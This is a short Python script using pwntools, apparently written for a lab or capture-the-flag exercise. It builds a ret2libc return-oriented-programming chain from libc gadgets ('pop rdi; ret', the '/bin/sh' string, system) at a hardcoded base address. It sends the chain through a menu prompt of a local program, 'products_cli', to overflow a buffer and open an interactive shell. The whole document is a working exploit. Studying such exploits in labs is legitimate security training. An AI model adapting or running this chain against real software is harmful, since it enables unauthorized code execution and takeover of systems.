from pwn import *

BINARY = '/lib/x86_64-linux-gnu/libc.so.6'

def run(exe):
    rop = ROP(exe, badchars='\n')

    libc_base_address = "0x00007ffff7c00000"
    offset= b"A"*264
  
    pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
    ret = rop.find_gadget(['ret']).address

    binsh = next(exe.search(b'/bin/sh'))
    system = exe.symbols["system"]
    
    pop_rdi = int(libc_base_address, 16)+ pop_rdi
    binsh = int(libc_base_address, 16)+ binsh
    system = int(libc_base_address, 16) + system
    ret = int(libc_base_address,16) + ret
    print("system: "+str(hex(system)))
    print("ret:"+str(hex(ret)))
    print("binsh:"+str(hex(binsh)))
    print("pop_rdi:"+str(hex(pop_rdi)))
    chain = flat(
        offset,
        pop_rdi,
        binsh,
        ret,
        system)
    print(chain.hex())


    p = process ("./products_cli")
    input()
    print(p.recvuntil(b"Enter your choice:\n"))
    p.sendline(b"2")
    print(p.recvline())
    p.sendline(b"prova")
    print(p.recvline())
    p.sendline(chain)
    print(p.recvline())
    p.sendline()
    p.interactive()



if __name__ == '__main__':
    context(arch='amd64')
    exe = ELF(BINARY, checksec=False)
    run(exe)
